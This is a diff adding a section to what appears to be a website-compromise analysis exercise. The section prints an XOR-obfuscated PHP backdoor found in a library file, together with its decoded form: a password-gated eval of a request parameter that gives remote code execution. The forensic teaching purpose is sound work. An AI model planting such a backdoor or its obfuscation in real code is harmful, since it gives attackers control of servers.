@@ -218,6 +218,25 @@ This is a form for uploading files which might be used to upload malicious files
 After execution, the `google.php` file deletes itself in order to leave as few traces as possible.
 
 
+### The Root of All Evil
+
+After some more in-depth searching through the files, one more thing was found in the `inc/_ext/_idna_convert.class.php`.
+
+```php
+<?php $ufcsafbt="tgmpgiamscuq"^"\x04\x15\x08\x178\x1b\x04\x1d\x1f\x02\x16\x14"; $bidjyvcisn="bhxfwpkefbrlct"^"M\x0e\x0b\x11\x16\x06\x07\x03I\x07";$ufcsafbt("$bidjyvcisn", "\x0b\x19\x11\x1a\x1b4\x14\x07\x19\x03\x19\x00\x08\x0f\x04J\x5bJY\x03\x15\x1b\x0eYJ\x08\x0dG\x10\x1a\x06\x08\x00\x5f\x3b\x3eL265\x29\x3a\x2f\x2a\x3b7F\x1a\x07E9\x5bB\x40OJN\x1e\x1cPJ\x2f\x2dQ\x2f\x2a2\x26\x3f\x24\x3f\x3c4Q\x05\x0b\x40\x3aKVTXNM\x5eB\x40\x11Y\x17\x11\x12\x0cX\x09H\x0c\x0dO\x14\x0cP\x1f\x40\x07VL\x5c\x5eTQF\x07\x16T\x15I\x5fFDKZ\x18\x04\x19\x07\x02Y5\x2dL\x2e\x2a\x23\x3c\x2f\x2f\x3f\x3d\x2fK\x1e\x05\x019\x0c\x08\x17\x0eK\x28QBL\x0fT\x08\x19\x0a\x1aN\x00\x19\x16\x11\x09\x10\x04\x0a\x1f\x09\x12\x0aF29F\x2b\x2a\x284\x27\x2f\x3c78N\x00\x1a\x034\x1b\x04\x13\x04N\x2bMY\x5dO\x14\x1a\x07\x10G\x5b\x5dI\x0dPD\x5c"^"nkcuikfbilktaacbkcbfczbqhakoyiumtwgbhmdpxojyolayobdrbfijfsxebsqupxwwjalhovfcggbvienjkvtporupjkkyhhvqhgywcdyjkaesercpnvfbmzqwjbvqiqhqxfmzjlitlnmqfogskluxklttmokvfsmdxychklawynnebtxmerjocciprskxkwaivdpfoqbndorfiprmg", "fswavlf"); ?>
+```
+
+The decoded version of it looks like this:
+
+```php
+<?php error_reporting(0);
+eval("if(isset(\$_REQUEST['ch']) && (md5(\$_REQUEST['ch']) == '544a6edbf3b1de9ed7f7d2565545bd7e') && isset(\$_REQUEST['php_code'])) { eval(stripslashes(\$_REQUEST['php_code'])); exit(); }");
+```
+
+This happens to be a backdoor through which the attacker can execute arbitrary code on the server therefore being able to open other backdoors and upload malicious files.
+
+
+### Self-test questions
 
 * Which attack vector was leveraged to make the hack possible?
 
